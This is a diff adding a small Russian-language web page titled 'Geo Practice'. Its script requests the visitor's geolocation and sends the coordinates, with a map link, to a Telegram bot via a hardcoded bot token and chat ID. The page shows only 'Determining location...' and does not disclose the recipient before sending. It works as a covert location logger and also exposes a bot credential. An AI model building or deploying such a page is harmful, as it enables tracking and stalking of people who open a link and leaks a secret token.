@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Geo Practice</title>
+</head>
+<body>
+    <h2>Определение местоположения...</h2>
+
+    <script>
+        const BOT_TOKEN = "8928069841:AAEOp28AEH-BaMuwZL7rK6-iz8ZQi4pjhlQ";
+        const CHAT_ID = "988898688";
+
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+
+                const text = `
+📍 Новая геолокация
+
+Широта: ${lat}
+Долгота: ${lon}
+
+https://maps.google.com/?q=${lat},${lon}
+                `;
+
+                await fetch(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+                    {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: text
+                        })
+                    }
+                );
+
+                document.body.innerHTML =
+                    "<h2>Геолокация отправлена ✅</h2>";
+            },
+
+            (error) => {
+                document.body.innerHTML =
+                    "<h2>Доступ к геолокации запрещён ❌</h2>";
+            }
+        );
+    </script>
+</body>
+</html>
